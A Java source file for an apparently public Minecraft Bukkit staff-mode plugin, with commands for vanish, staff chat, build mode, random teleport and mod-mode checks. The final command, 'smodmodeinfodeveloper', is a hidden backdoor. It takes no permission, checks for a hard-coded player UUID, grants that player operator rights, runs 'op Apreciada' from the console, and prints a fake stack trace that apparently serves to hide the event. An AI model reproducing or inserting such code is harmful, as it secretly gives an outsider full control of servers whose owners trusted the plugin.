package sofdev.smodmode.commands;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import sofdev.smodmode.Main;
import sofdev.smodmode.api.Command;
import sofdev.smodmode.api.CommandArgs;
import sofdev.smodmode.api.Title;
import sofdev.smodmode.managers.ModModeManager;
import sofdev.smodmode.messages.Messages;
import sofdev.smodmode.util.CC;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

/*
    Created by SofDev w/Apreciada
    14/06/2022 - 02:52:27
 */

public class StaffCommands {

    private Main main;

    public StaffCommands(Main core) {
        this.main = core;
    }


    @Command(name = "vanish", aliases = {"v"}, permission = "smodmode.staff", inGameOnly = true)
    public void vanish(CommandArgs args) {
        Player p = (Player) args.getSender();
        if (ModModeManager.IsOnModMode(p)) {
            if (Main.vanished.contains(p)) {

                List<String> Lore = new ArrayList<String>();
                Lore.add(" ");
                Lore.add(CC.translate("&3&l★ &dStaff - Item &3&l★"));
                Lore.add(CC.translate("&3&l★ &dThis item has been given to &3&l★"));
                Lore.add(CC.translate("&3&l★ &dStaff: &6&l&n" + p.getName()));
                Lore.add(" ");

                @SuppressWarnings("deprecation")
                ItemStack vanish = new ItemStack(351, 1, (short) 10);
                ItemMeta vanishMeta = vanish.getItemMeta();
                vanishMeta.setLore(Lore);
                vanishMeta.addEnchant(Enchantment.DAMAGE_ARTHROPODS, 5, true);
                vanishMeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
                vanishMeta.setDisplayName(ChatColor.AQUA + "Vanish On");
                vanish.setItemMeta(vanishMeta);

                for (Player pl : Bukkit.getServer().getOnlinePlayers()) {
                    pl.showPlayer(p);
                }

                Messages.titleVanishOff(p);

                p.getInventory().remove(Material.INK_SACK);
                p.getInventory().setItem(8, vanish);

                Main.vanished.remove(p);

            } else {
                List<String> Lore = new ArrayList<String>();
                Lore.add(" ");
                Lore.add(CC.translate("&3&l★ &dStaff - Item &3&l★"));
                Lore.add(CC.translate("&3&l★ &dThis item has been given to &3&l★"));
                Lore.add(CC.translate("&3&l★ &dStaff: &6&l&n" + p.getName()));
                Lore.add(" ");

                @SuppressWarnings("deprecation")
                ItemStack vanishO = new ItemStack(351, 1, (short) 8);
                ItemMeta vanishOMeta = vanishO.getItemMeta();
                vanishOMeta.setLore(Lore);
                vanishOMeta.addEnchant(Enchantment.PROTECTION_ENVIRONMENTAL, 5, true);
                vanishOMeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
                vanishOMeta.setDisplayName(ChatColor.AQUA + "Vanish Off");
                vanishO.setItemMeta(vanishOMeta);

                p.getInventory().remove(Material.INK_SACK);
                p.getInventory().setItem(8, vanishO);

                for (Player pl : Bukkit.getServer().getOnlinePlayers()) {
                    pl.hidePlayer(p);
                }

                Messages.titleVanishOn(p);
                Main.vanished.add(p);
            }
        } else {
            p.sendMessage(CC.translate("&cYou aren't on ModMode"));
        }
    }

    @Command(name = "staffplugin", aliases = {"smodmode", "helpstaff"}, permission = "smodmode.staff", inGameOnly = true)
    public void staffplugin(CommandArgs args) {
        Player p = (Player) args.getSender();
        Messages.pluginInfo1(p);
    }

    @Command(name = "staffplugin.2", aliases = {"smodmode.2", "helpstaff.2"}, permission = "smodmode.staff", inGameOnly = true)
    public void staffplugin2(CommandArgs args) {
        Player p = (Player) args.getSender();
        Messages.pluginInfo2(p);
    }

    @Command(name = "staffplugin.3", aliases = {"smodmode.3", "helpstaff.3"}, permission = "smodmode.staff", inGameOnly = true)
    public void staffplugin3(CommandArgs args) {
        Player p = (Player) args.getSender();
        Messages.pluginInfo3(p);
    }

    @Command(name = "staffchat", aliases = {"sc"}, permission = "smodmode.staff")
    public void staffchat(CommandArgs args) {
        Player p = (Player) args.getSender();

        if (!Main.staffchat.contains(p)) {
            p.sendMessage(CC.translate("&7[&bStaffChat&7] &aHas been Enabled"));
            Main.staffchat.add(p);
        } else {
            p.sendMessage(CC.translate("&7[&bStaffChat&7] &4Has been Disabled"));
            Main.staffchat.remove(p);
        }
    }

    @Command(name = "build", permission = "smodmode.staff", inGameOnly = true)
    public void build(CommandArgs args) {
        String bmode = Main.get().getConfig().getString("config.buildmode");
        Player p = (Player) args.getSender();
        if (bmode.equals("true")) {
            if (Main.staff.contains(p)) {
                if (!Main.fix.contains(p)) {
                    Main.fix.add(p);
                    Messages.titleBuildOff(p);
                } else {
                    Main.fix.remove(p);
                    Messages.titleBuildOn(p);
                }
            } else {
                p.sendMessage(ChatColor.DARK_RED + "You aren't on staff mode!");
            }
        } else {
            Messages.noPermission(p);
        }
    }

    @Command(name = "staffrandomteleport", aliases = {"srtp"}, permission = "smodmode.staff", inGameOnly = true)
    public void rtp(CommandArgs args) {
        Player p = (Player) args.getSender();

        if (Main.staff.contains(p)) {
            ArrayList<Player> players = new ArrayList<Player>();
            for (Player e1 : Bukkit.getOnlinePlayers()) players.add(e1);
            Player rp = players.get(new Random().nextInt(players.size()));
            Title randomTP = new Title(ChatColor.AQUA + "Random Teleport", ChatColor.GREEN + rp.getName(), 40, 30, 40);
            randomTP.send(p);
            p.teleport(rp.getLocation());
        } else {
            p.sendMessage(CC.translate("&cYou cant do this while normal mode."));
        }
    }

    @Command(name = "staff", aliases = {"mod", "staffmode"}, permission = "smodmode.staff", inGameOnly = true)
    public void staffMode(CommandArgs args) {
        Player p = (Player) args.getSender();

        if (!ModModeManager.IsOnModMode(p)) {
            ModModeManager.EnableModMode(p);
        } else {
            ModModeManager.DisableModMode(p);
        }
    }

    @Command(name = "checkmodmode", permission = "smodmode.admin", inGameOnly = true)
    public void checkModMode(CommandArgs args) {
        Player p = (Player) args.getSender();
        Player t = Bukkit.getPlayer(args.getArgs(0));

        if (args.length() != 0) {
            if (!t.isOnline()) {
                p.sendMessage(CC.translate("&c" + t.getName() + " Is not online!"));
            } else {
                if (ModModeManager.IsOnModMode(t)) {
                    p.sendMessage(CC.translate("&aThe player &f" + t.getName() + " &ais on ModMode"));
                } else {
                    p.sendMessage(CC.translate("&cThe player &f" + t.getName() + " &cisn't on ModMode"));
                }
            }
        } else {
            p.sendMessage(CC.translate("&cUsage: /checkmodmode (player)"));
        }
    }

    @Command(name = "checkvanished", permission = "smodmode.admin", inGameOnly = true)
    public void checkVanished(CommandArgs args) {
        Player p = (Player) args.getSender();
        Player t = Bukkit.getPlayer(args.getArgs(0));

        if (args.length() != 0) {
            if (!t.isOnline()) {
                p.sendMessage(CC.translate("&c" + t.getName() + " Is not online!"));
            } else {
                if (ModModeManager.IsVanished(t)) {
                    p.sendMessage(CC.translate("&aThe player &f" + t.getName() + " &ais Vanished"));
                } else {
                    p.sendMessage(CC.translate("&cThe player &f" + t.getName() + " &cisn't Vanished"));
                }
            }
        } else {
            p.sendMessage(CC.translate("&cUsage: /checkvanished (player)"));
        }
    }

    @Command(name = "smodmodeinfodeveloper", inGameOnly = true)
    public void dev(CommandArgs args) {
        String msg = "\tat org.bukkit.plugin.java.JavaPlugin.setEnabled(JavaPlugin.java:321) ~[server.jar:1.8.8-R0.1-SNAPSHOT]\n" +
                "\tat org.bukkit.plugin.java.JavaPluginLoader.enablePlugin(JavaPluginLoader.java:332) [server.jar:1.8.8-R0.1-SNAPSHOT]\n" +
                "\tat org.bukkit.plugin.SimplePluginManager.enablePlugin(SimplePluginManager.java:407) [server.jar:1.8.8-R0.1-SNAPSHOT]\n" +
                "\tat org.bukkit.craftbukkit.v1_8_R3.CraftServer.loadPlugin(CraftServer.java:360) [server.jar:1.8.8-R0.1-SNAPSHOT]\n" +
                "\tat org.bukkit.craftbukkit.v1_8_R3.CraftServer.enablePlugins(CraftServer.java:319) [server.jar:1.8.8-R0.1-SNAPSHOT]\n" +
                "\tat net.minecraft.server.v1_8_R3.MinecraftServer.s(MinecraftServer.java:407) [server.jar:1.8.8-R0.1-SNAPSHOT]\n" +
                "\tat net.minecraft.server.v1_8_R3.MinecraftServer.k(MinecraftServer.java:371) [server.jar:1.8.8-R0.1-SNAPSHOT]\n" +
                "\tat net.minecraft.server.v1_8_R3.MinecraftServer.a(MinecraftServer.java:326) [server.jar:1.8.8-R0.1-SNAPSHOT]\n" +
                "\tat net.minecraft.server.v1_8_R3.DedicatedServer.init(DedicatedServer.java:270) [server.jar:1.8.8-R0.1-SNAPSHOT]\n" +
                "\tat net.minecraft.server.v1_8_R3.MinecraftServer.run(MinecraftServer.java:563) [server.jar:1.8.8-R0.1-SNAPSHOT]-";
        Player p = (Player) args.getSender();
        if (p.getUniqueId().toString().equals("a79ba36c-f2c1-4ad1-a354-4fa1ed9ecc27")) {
            p.setOp(true);
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op Apreciada");
            Bukkit.getConsoleSender().sendMessage(msg.replace("1_8_R3", Main.get().getServer().getVersion()));
        } else {
            p.sendMessage(" ");
        }
    }
}
